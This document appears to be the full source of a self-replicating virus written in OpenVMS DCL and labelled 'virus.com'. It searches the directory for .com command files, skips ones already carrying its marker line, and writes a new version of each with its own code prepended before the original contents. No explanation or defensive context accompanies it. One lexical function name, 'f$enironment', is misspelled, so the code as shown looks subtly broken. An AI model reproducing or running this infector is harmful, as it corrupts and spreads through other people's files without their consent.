$!  virus.com
$!
$v_main_loop:
$   comfile = f$search("*.com", 1)
$   if (comfile .eqs. "") then goto v_end
$!
$!
$   open infile 'comfile /error=v_main_loop
$   read infile regel /end_of_file=v_empty
$v_empty:
$   close infile
$   if (regel .eqs. "$!  virus.com") then goto v_main_loop
$!
$!
$   comfile2 = f$extract (0, f$locate(";", comfile), comfile)
$   open /write outfile 'comfile2 /error=v_main_loop
$!
$!
$   me = f$enironment ("procedure")
$   open infile 'me /error=v_infect_end
$v_insert_loop:
$   read infile regel /end_of_file=v_insert_end
$   write outfile regel
$   if (regel .nes. "$v_end:") then goto v_insert_loop
$v_insert_end:
$   close infile
$!
$!
$   open infile 'comfile /error=v_infect_end
$v_copy_loop:
$   read infile regel /end_of_file=v_copy_end
$   write outfile regel
$   goto v_copy_loop
$v_copy_end:
$   close infile
$!
$!
$v_infect_end:
$   close outfile
$!
$   goto v_main_loop
$!
$v_end:
